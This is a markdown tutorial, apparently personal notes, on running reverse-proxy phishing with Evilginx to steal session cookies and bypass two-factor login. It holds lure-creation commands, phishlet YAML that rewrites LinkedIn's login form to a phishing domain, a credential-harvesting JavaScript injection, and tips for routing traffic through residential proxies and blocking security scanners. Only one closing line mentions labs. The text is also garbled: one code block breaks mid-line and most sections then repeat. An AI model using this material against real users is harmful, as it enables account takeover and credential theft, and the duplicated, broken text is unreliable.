### Session Token
A session token is a unique identifier that is generated and assigned to a user's session when they log into an application or a website, enabling the system to recognize and manage the state of interaction with that user.

Workflow:
- You log in → server verifies your username/password
- Server creates a session → generates a session token
- Browser stores session token in a cookie
- Each time you load a new page, your browser sends the session token
- Server checks the token → allows access
- Session ends when you log out or it times out

### Reverse Proxy Phishing
**Reverse proxy phishing** is a phishing attack where the attacker uses a fake website acting as a _middleman_ (a reverse proxy) between the victim and the real website. This lets the attacker capture the victim’s **real session cookies/tokens** _after_ they log in, allowing the attacker to take over the account without needing the password or 2FA.

### Phishlets
A phishlet is typically a **YAML configuration** that describes:

1. **Target domain and subdomains**
2. **Which pages to proxy** (e.g., `/login`, `/auth`)
3. **Which resources should be rewritten** (JS, CSS, images)
4. **Session/cookie rules** — which tokens should be captured
5. **Authentication flow logic**
6. **Custom behaviors**, e.g., blocking non-browser bots


### How to Create Phishlets
- Configure the base domain. this will be our base phishing Domain
	```
	config domain <domain_name> 
	```
- Configure IP address of the evilgnix server
	```
	config ipv4 <ip>
	```
- Configure the phishing hostname. The hostname should end with the phishing domain
	```
	phishlets hostname <phishlet> <domainending with the phishing_domain>### Session Token
A session token is a unique identifier that is generated and assigned to a user's session when they log into an application or a website, enabling the system to recognize and manage the state of interaction with that user.

Workflow:
- You log in → server verifies your username/password
- Server creates a session → generates a session token
- Browser stores session token in a cookie
- Each time you load a new page, your browser sends the session token
- Server checks the token → allows access
- Session ends when you log out or it times out

### Reverse Proxy Phishing
**Reverse proxy phishing** is a phishing attack where the attacker uses a fake website acting as a _middleman_ (a reverse proxy) between the victim and the real website. This lets the attacker capture the victim’s **real session cookies/tokens** _after_ they log in, allowing the attacker to take over the account without needing the password or 2FA.

### Phishlets
A phishlet is typically a **YAML configuration** that describes:

1. **Target domain and subdomains**
2. **Which pages to proxy** (e.g., `/login`, `/auth`)
3. **Which resources should be rewritten** (JS, CSS, images)
4. **Session/cookie rules** — which tokens should be captured
5. **Authentication flow logic**
6. **Custom behaviors**, e.g., blocking non-browser bots


### How to Create Phishlets
- Configure the base domain. this will be our base phishing Domain
	```
	config domain <domain_name> 
	```
- Configure IP address of the evilgnix server
	```
	config ipv4 <ip>
	```
- Configure the phishing hostname. The hostname should end with the phishing domain
	```
	phishlets hostname <phishlet> <domainending with the phishing_domain>
	```
- Enable the phishlet
	```
	phishlets enable <phishlet>
	```
- create Lure aka  Phishing link
	```
	lure create <phishlet>
	```
- generate the url link
	```
	lure get-url <lure-id>
	```
- create a lure with custom path
	```
	lure edit <id_of_lure> path <convinving_path> 
	```
- create a lure with custom hostname but it will end with our base phishing domain
	```
	lure edit <id_of_lure> hostname <convinving_hostname> 
	```
- configure an redirect url which will redirect the user after  all the session token are stolen to keep the rhythm
	```
	lure edit <id_0f_lure> redirect_url <custom_url_to_redirect>
	```
- custom parameters are dynamic variables embedded in the phishing URL to personalize the lure for each victim. They can be used in pre-phish HTML templates or injected JavaScript to customize content like the target's name or email, making the attack more convincing
	```
	lures get-url <id> param1=value1 param2="value2 with spaces"
	```
### OpenGraph Setup
If we are phishing using social media like discord or Microsoft fteams  when we post a link we will see a text/ title and an image of the embedded link. we can see them how they look like in [Opengraph.xyz](https://opengraph.xyz) site.

- configure the title preview
	```
	lure edit <id_0f_lure> og_title  <custom_title>
	```
- Configure the image preview
	```
	lure edit <id_0f_lure> og_image  <image_link>
	```


### Replacing Proxied content
Evilginx uses `auto_filter` (in older versions, this was done using Nginx's `sub_filter`) to automatically identify and replace content in the proxied response. This ensures that links pointing back to the legitimate site are rewritten to point to the phishing server, preventing the user from escaping the attack flow

Phishlet designers can use the `sub_filters` section in the phishlet's YAML configuration file to manually define specific string or regular expression replacements for dynamic content that the automatic filter might miss. 

Key parameters for `sub_filters` include:

- **`triggers_on`**: The original hostname where the filter should be applied.
- **`search`**: The regular expression to search for in the response body.
- **`replace`**: The string that will replace all occurrences matching the search expression.
- **`mimes`**: An array of MIME types (e.g., `text/html`, `application/json`) for which the filter will trigger.
```
sub_filters:
  - triggers_on: "www.linkedin.com"
    search: 'action="https://www\\.linkedin\\.com'
    replace: 'action="https://www.totally.not.fake.linkedin.our-phishing-domain.com'
    mimes: [ "text/html" ]

```


### Forcing Post Parameters
You can force POST parameters using the **`force_post`** section within a phishlet's YAML configuration file. This feature allows you to add or replace specific POST arguments in intercepted requests, which is useful for actions such as enabling a "Remember Me" option during authentication, even if the user did not select it

```
force_post:
  - path: '/path/to/specific/endpoint' # Regular expression to match the URL path
    search: # Trigger POST arguments (all must be present for the force to apply)
      - {key: 'arg_key_1', search: 'regexp_to_match_value_1'}
      - {key: 'arg_key_2', search: 'regexp_to_match_value_2'}
    force: # List of POST arguments to insert or replace
      - {key: 'new_arg_key', value: 'new_arg_value'}
      - {key: 'remember_me', value: 'on'} # Example: Force "Remember Me"
    type: 'post' # Currently, only 'post' is supported for this section

```

#### Handling JSON and Local Storage
You can configure Evilginx to look for and capture specific parameters within a JSON payload sent in a POST request. This is done in the `credentials` or `auth_tokens` sections of the phishlet.
```
credentials:
  - key: "username"
    type: json
    search: '"username":"([^"]+)"'
```

Directly accessing a user's local storage from the server side is not possible. Evilginx works around this limitation by injecting custom JavaScript into the proxied web pages. 

- **JavaScript Injection:** You inject client-side JavaScript that interacts with the `localStorage` API. This script can:
    - Retrieve items from local storage using `localStorage.getItem('key')`.
    - Parse the retrieved JSON strings into objects using `JSON.parse()`.
    - Exfiltrate this data to the Evilginx server, typically by making a separate background request (e.g., an HTTP long poll or a specific fetch request) to a controlled endpoint on the phishing domain.

### JavaScript Injection

Attackers define the JavaScript to be injected within the `js_inject` section of a phishlet configuration file. This configuration specifies conditions like `trigger_domains`, `trigger_paths`, and `trigger_params` to control exactly when and where the script is inserted into the proxied web pages.**JavaScript is injected** into the page before it reaches the victim’s browser.
- JS executes in the victim’s browser:
    - Reads form inputs (username/password)
    - Accesses `window.localStorage` or cookies
    - Sends data back to Evilginx server
```
js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: ["/uas/login"]
    # This injection only runs if the 'email' parameter is configured in the lure
    trigger_params: ["email"] 
    script: |
      function lp() {
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          // '{email}' is a placeholder replaced by Evilginx with the target's email
          email.value = "{email}"; 
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```

### Landing page Redirector 
Redirectors are little websites, acting as a landing pages to your phishing links. When anyone clicks on your generated phishing link, they will land on the redirector website. This website should redirect the visitor to the reverse proxied phishing sign-in page, either automatically or by requiring some user interaction.

To create a redirector, navigate to the `evilginx/redirectors` directory and create a new folder (e.g., `AntiBotScan`).

Inside this folder, you can create an `index.html` file and embed JavaScript to control the redirection. Here’s a simple example that redirects the user after 2 seconds:

```html
<!DOCTYPE html>
<script>
    document.write(`<meta http-equiv="Refresh" content="2; url=` + {lure_url_js} + `">`);
</script>
<html>
<head>
    <title>Loading...</title>
</html>
```

In evilginx interface, simply type:

```html
lures edit <lure_id> redirector /root/redirectors/nothingredirect/index.html
```

### Proxying the Reverse proxy
Configuring the Evilginx server to forward all its traffic to the legitimate target through another proxy server (e.g., a commercial VPN or a residential proxy network). This changes the source IP address that the target organization's logs will see, making it harder to flag based on IP reputation or location anomalies (e.g., "impossible travel" detection).
The Evilginx Pro version includes a "Botguard" feature that detects automated scanners or bots and serves them a decoy website

```
proxy address <ip>
proxy port <port_number>
```

#### BlackList Management
When a user visits our phishing Domain with a broken link or with missing parameters we can redirect them to a fake website
```
~/.evilginx/blacklist.txt
```


## Security validation

#### Location Validation
Location validation on websites is the process of verifying a user's or a given address's actual location to ensure it is accurate and matches what is provided. Location validation is primarily a part of its **Botguard** feature, which is designed to identify and block automated scanners and security products from accessing the phishing website

#### Secret Token Validation
**Secret token validation** is a mechanism used to manage and verify user sessions safely. When someone clicks a link (called a “lure”) in a controlled lab environment, Evilginx generates a unique secret token for that session. This token is included in the URL, cookies, or hidden form fields. Whenever the user interacts with the page or submits credentials, Evilginx checks whether the token matches the one it generated for that session. If the token is valid, the session continues and data is processed (for testing purposes); if it is missing or invalid, the request is rejected. This system prevents unauthorized or accidental access to the server, ensures sessions are properly tracked, and protects against session hijacking or replay attacks. Essentially, the token acts like a “guest pass” that only allows legitimate sessions to proceed, and it is meant to be used **ethically in labs or penetration tests on systems you control**.
	```
- Enable the phishlet
	```
	phishlets enable <phishlet>
	```
- create Lure aka  Phishing link
	```
	lure create <phishlet>
	```
- generate the url link
	```
	lure get-url <lure-id>
	```
- create a lure with custom path
	```
	lure edit <id_of_lure> path <convinving_path> 
	```
- create a lure with custom hostname but it will end with our base phishing domain
	```
	lure edit <id_of_lure> hostname <convinving_hostname> 
	```
- configure an redirect url which will redirect the user after  all the session token are stolen to keep the rhythm
	```
	lure edit <id_0f_lure> redirect_url <custom_url_to_redirect>
	```
- custom parameters are dynamic variables embedded in the phishing URL to personalize the lure for each victim. They can be used in pre-phish HTML templates or injected JavaScript to customize content like the target's name or email, making the attack more convincing
	```
	lures get-url <id> param1=value1 param2="value2 with spaces"
	```
### OpenGraph Setup
If we are phishing using social media like discord or Microsoft fteams  when we post a link we will see a text/ title and an image of the embedded link. we can see them how they look like in [Opengraph.xyz](https://opengraph.xyz) site.

- configure the title preview
	```
	lure edit <id_0f_lure> og_title  <custom_title>
	```
- Configure the image preview
	```
	lure edit <id_0f_lure> og_image  <image_link>
	```


### Replacing Proxied content
Evilginx uses `auto_filter` (in older versions, this was done using Nginx's `sub_filter`) to automatically identify and replace content in the proxied response. This ensures that links pointing back to the legitimate site are rewritten to point to the phishing server, preventing the user from escaping the attack flow

Phishlet designers can use the `sub_filters` section in the phishlet's YAML configuration file to manually define specific string or regular expression replacements for dynamic content that the automatic filter might miss. 

Key parameters for `sub_filters` include:

- **`triggers_on`**: The original hostname where the filter should be applied.
- **`search`**: The regular expression to search for in the response body.
- **`replace`**: The string that will replace all occurrences matching the search expression.
- **`mimes`**: An array of MIME types (e.g., `text/html`, `application/json`) for which the filter will trigger.
```
sub_filters:
  - triggers_on: "www.linkedin.com"
    search: 'action="https://www\\.linkedin\\.com'
    replace: 'action="https://www.totally.not.fake.linkedin.our-phishing-domain.com'
    mimes: [ "text/html" ]

```


### Forcing Post Parameters
You can force POST parameters using the **`force_post`** section within a phishlet's YAML configuration file. This feature allows you to add or replace specific POST arguments in intercepted requests, which is useful for actions such as enabling a "Remember Me" option during authentication, even if the user did not select it

```
force_post:
  - path: '/path/to/specific/endpoint' # Regular expression to match the URL path
    search: # Trigger POST arguments (all must be present for the force to apply)
      - {key: 'arg_key_1', search: 'regexp_to_match_value_1'}
      - {key: 'arg_key_2', search: 'regexp_to_match_value_2'}
    force: # List of POST arguments to insert or replace
      - {key: 'new_arg_key', value: 'new_arg_value'}
      - {key: 'remember_me', value: 'on'} # Example: Force "Remember Me"
    type: 'post' # Currently, only 'post' is supported for this section

```

#### Handling JSON and Local Storage
You can configure Evilginx to look for and capture specific parameters within a JSON payload sent in a POST request. This is done in the `credentials` or `auth_tokens` sections of the phishlet.
```
credentials:
  - key: "username"
    type: json
    search: '"username":"([^"]+)"'
```

Directly accessing a user's local storage from the server side is not possible. Evilginx works around this limitation by injecting custom JavaScript into the proxied web pages. 

- **JavaScript Injection:** You inject client-side JavaScript that interacts with the `localStorage` API. This script can:
    - Retrieve items from local storage using `localStorage.getItem('key')`.
    - Parse the retrieved JSON strings into objects using `JSON.parse()`.
    - Exfiltrate this data to the Evilginx server, typically by making a separate background request (e.g., an HTTP long poll or a specific fetch request) to a controlled endpoint on the phishing domain.

### JavaScript Injection

Attackers define the JavaScript to be injected within the `js_inject` section of a phishlet configuration file. This configuration specifies conditions like `trigger_domains`, `trigger_paths`, and `trigger_params` to control exactly when and where the script is inserted into the proxied web pages.**JavaScript is injected** into the page before it reaches the victim’s browser.
- JS executes in the victim’s browser:
    - Reads form inputs (username/password)
    - Accesses `window.localStorage` or cookies
    - Sends data back to Evilginx server
```
js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: ["/uas/login"]
    # This injection only runs if the 'email' parameter is configured in the lure
    trigger_params: ["email"] 
    script: |
      function lp() {
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          // '{email}' is a placeholder replaced by Evilginx with the target's email
          email.value = "{email}"; 
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```

### Landing page Redirector 
Redirectors are little websites, acting as a landing pages to your phishing links. When anyone clicks on your generated phishing link, they will land on the redirector website. This website should redirect the visitor to the reverse proxied phishing sign-in page, either automatically or by requiring some user interaction.

To create a redirector, navigate to the `evilginx/redirectors` directory and create a new folder (e.g., `AntiBotScan`).

Inside this folder, you can create an `index.html` file and embed JavaScript to control the redirection. Here’s a simple example that redirects the user after 2 seconds:

```html
<!DOCTYPE html>
<script>
    document.write(`<meta http-equiv="Refresh" content="2; url=` + {lure_url_js} + `">`);
</script>
<html>
<head>
    <title>Loading...</title>
</html>
```

In evilginx interface, simply type:

```html
lures edit <lure_id> redirector /root/redirectors/nothingredirect/index.html
```

### Proxying the Reverse proxy
Configuring the Evilginx server to forward all its traffic to the legitimate target through another proxy server (e.g., a commercial VPN or a residential proxy network). This changes the source IP address that the target organization's logs will see, making it harder to flag based on IP reputation or location anomalies (e.g., "impossible travel" detection).
The Evilginx Pro version includes a "Botguard" feature that detects automated scanners or bots and serves them a decoy website

```
proxy address <ip>
proxy port <port_number>
```

#### BlackList Management
When a user visits our phishing Domain with a broken link or with missing parameters we can redirect them to a fake website
```
~/.evilginx/blacklist.txt
```


## Security validation

#### Location Validation
Location validation on websites is the process of verifying a user's or a given address's actual location to ensure it is accurate and matches what is provided. Location validation is primarily a part of its **Botguard** feature, which is designed to identify and block automated scanners and security products from accessing the phishing website

#### Secret Token Validation
**Secret token validation** is a mechanism used to manage and verify user sessions safely. When someone clicks a link (called a “lure”) in a controlled lab environment, Evilginx generates a unique secret token for that session. This token is included in the URL, cookies, or hidden form fields. Whenever the user interacts with the page or submits credentials, Evilginx checks whether the token matches the one it generated for that session. If the token is valid, the session continues and data is processed (for testing purposes); if it is missing or invalid, the request is rejected. This system prevents unauthorized or accidental access to the server, ensures sessions are properly tracked, and protects against session hijacking or replay attacks. Essentially, the token acts like a “guest pass” that only allows legitimate sessions to proceed, and it is meant to be used **ethically in labs or penetration tests on systems you control**.
